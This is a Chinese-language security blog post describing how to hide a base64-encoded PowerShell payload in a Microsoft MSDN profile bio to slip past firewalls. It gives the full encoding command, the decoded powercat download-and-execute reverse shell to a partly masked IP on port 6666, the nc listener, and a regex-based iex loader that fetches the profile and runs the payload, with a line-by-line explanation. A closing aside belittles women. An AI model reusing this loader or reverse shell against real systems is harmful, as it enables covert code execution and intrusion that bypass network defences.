---
layout: post
title: "使用Microsoft.com域绕过防火墙并执行有效负载" 
subtitle: "使用Microsoft.com域绕过防火墙并执行有效负载"
date: 2019-07-13
author: ppbibo
category: APT攻击
---

[TOC]

**PS：**

看到九世哥哥发的文章感觉思路很骚就去复现一下玩玩，但是奈何本人的windows 7 不给力 低版本的prowershell 不支持 `Invoke-WebRequest`、`iwr`、`curl`和`wget`（其实他们是一个东西）所以把虚拟机的prowershell 给删了。



## 0x1 利用方法反弹一个shell

注册 microsoft 账号，然后插入base64 编码的payload

打印 base64编码后的payload命令如下：

```bash
printf '%s' "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 161.129.xx.xx -p 6666 -e cmd" | base64 | tr -d '\n'
```

输出：

```bash
SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViY2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jlc2ltb3JoaW5vL3Bvd2VyY2F0L21hc3Rlci9wb3dlcmNhdC5wczEnKTtwb3dlcmNhdCAtYyAxNjEuMTI5LjQzLjE2OSAtcCA2NjY2IC1lIGNtZA==
```

**RT：**

![microsoft-1](/static/img/microsoft-1.png)

*Tag：ip 自己改哦！（因为这个被九世哥哥骂了一下；俗话说打是亲骂是爱我不怪他。）*



将base64编码后的 payload 插入到作者简介中 **RT：**

![microsoft-2](/static/img/microsoft-2.png)

**TAG：不要忘记开头的 START 还有结尾的 END** *( 用来正则匹配的 )*。



接下来就是执行powershell command反弹shell了。打开服务器

#### 服务器IP：161.129.xxx.xxx

#### 服务器监听 6666 端口

```bash
$ nc -lvvp 6666
```

*PS ： 等待了一个下午。。。*😭



## 0x2 群里弟弟求助哥哥们

我拿出了妹子联系方式做为交换求他们执行一下 让我反弹个shell 

![microsoft-3](/static/img/microsoft-3.png)



最终九世哥哥耐不住寂寞要开机祝我一臂之力了。

#### PowerShell Execution code

```bash
$wro = iwr -Uri https://social.msdn.microsoft.com/Profile/testestPPbibo -UseBasicParsing;$r = [Regex]::new("(?<=START)(.*)(?=END)");$m = $r.Match($wro.rawcontent);if($m.Success){ $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m.value));iex $p };
```

##### 代码解析：

```bash
$wro = iwr -Uri https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -UseBasicParsing;  -> 请求url获取源码
```

```bash
$r = Regex::new("(?<=START)(.*)(?=END)"); -> 正则表达式
```

```bash
$m = $r.Match($wro.rawcontent);  -> 正则匹配，创建变量m
```

```bash
if($m.Success){ $p = System.Text.Encoding::UTF8.GetString(System.Convert::FromBase64String($m.value));      -> 如果匹配到正则，解码base64赋值为$p
```

```bash
iex $p   -> 执行payload
```

执行代码**RT ：**

![microsoft-4](/static/img/microsoft-4.png)



我的服务器 say 来了来了。。。

![microsoft-5](/static/img/microsoft-5.png)

在反弹的过程中不是很顺利 卡死多次，但是为了提升点bi格。

九世哥哥提议弹个calc 。

![microsoft-6](/static/img/microsoft-6.png)

将 microsoft 作者简介中 Payload 替换掉 **RT：**

![microsoft-7](/static/img/microsoft-7.png)

然后九世哥哥给出了一张有Bi格的图片：

![microsoft-8](/static/img/microsoft-8.png)



OK 结束了 是时候兑现自己诺言了。

![microsoft-9](/static/img/microsoft-9.png)



**九世哥哥果然是英雄好汉，好了！🙏一下大佬**



## 总结

思路骚才是硬道理

这种方式深入一下利用方式很不错的仅提供思路

*妹子只会打扰阻碍大佬前进的步伐，九世哥哥是个很好的例子。*



[参考](https://www.secquan.org/Discuss/1069837)